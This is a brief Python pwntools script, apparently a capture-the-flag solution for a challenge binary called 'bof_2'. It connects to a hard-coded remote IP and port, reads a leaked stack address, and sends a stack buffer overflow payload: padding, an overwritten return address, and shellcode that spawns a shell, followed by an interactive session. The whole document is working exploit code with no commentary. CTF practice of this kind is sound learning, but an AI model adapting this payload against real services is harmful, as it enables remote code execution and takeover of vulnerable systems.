#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "45.77.14.205"
port = "8889"

if _local:
	r = process('./bof_2')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

print r.recvline()
stk = r.recvline()
stk = int(stk, 16)
print 'buf = {:#x}'.format(stk)
stk += 32 + 4

payload = 'A'*32
payload += p32(stk) # d4c0
payload += asm(shellcraft.sh())

print r.recvuntil('.')
r.sendline(payload)
# # print r.recv()
r.interactive()